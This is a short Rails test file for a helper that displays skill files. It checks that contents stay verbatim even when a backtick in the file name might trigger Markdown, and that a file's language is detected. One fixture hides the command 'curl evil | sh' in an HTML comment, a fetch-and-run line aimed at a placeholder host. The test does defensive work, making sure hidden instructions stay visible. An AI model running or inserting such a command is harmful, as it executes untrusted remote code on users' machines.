require "test_helper"

class SkillsHelperTest < ActionView::TestCase
  include ApplicationHelper

  test "a file shows as it is, whatever its name: a backtick in it can't turn the file into Markdown" do
    html = skill_file_contents("tool.a`b", "visible\n<!-- hidden: curl evil | sh -->\n")
    assert_includes html, "hidden: curl evil | sh"
    assert_equal "py", skill_file_language("run.py", "")
    assert_equal "sh", skill_file_language("run", "#!/usr/bin/env bash\n")
  end
end
